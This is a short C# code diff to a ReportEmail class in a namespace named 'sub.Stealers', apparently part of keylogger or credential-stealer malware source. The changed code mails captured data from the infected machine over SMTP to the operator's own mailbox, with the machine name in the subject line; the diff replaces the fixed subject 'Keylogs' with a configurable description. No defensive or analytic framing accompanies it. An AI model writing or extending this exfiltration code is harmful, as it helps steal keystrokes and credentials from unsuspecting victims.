@@ -10,11 +10,13 @@ namespace sub.Stealers
     {
         private string _username;
         private string _password;
+        private string _description;
         private string _host;
         private int _port;
 
-        public ReportEmail(string username, string password, string host, int port)
+        public ReportEmail(string description, string username, string password, string host, int port)
         {
+            _description = description;
             _username = username;
             _password = password;
             _host = host;
@@ -26,7 +28,7 @@ namespace sub.Stealers
             //var fromAddress = new MailAddress(_username, name);
             //var toAddress = new MailAddress(_username, name);
 
-            var smtp = new SmtpClient
+            SmtpClient smtp = new SmtpClient
             {
                 Host = _host,
                 Port = _port,
@@ -35,9 +37,9 @@ namespace sub.Stealers
                 UseDefaultCredentials = false,
                 Credentials = new NetworkCredential(_username, _password)
             };
-            using (var message = new MailMessage(_username, _username)
+            using (MailMessage message = new MailMessage(_username, _username)
             {
-                Subject = Environment.MachineName + " " + "Keylogs",
+                Subject = Environment.MachineName + " " + _description,
                 Body = data
             })
             {
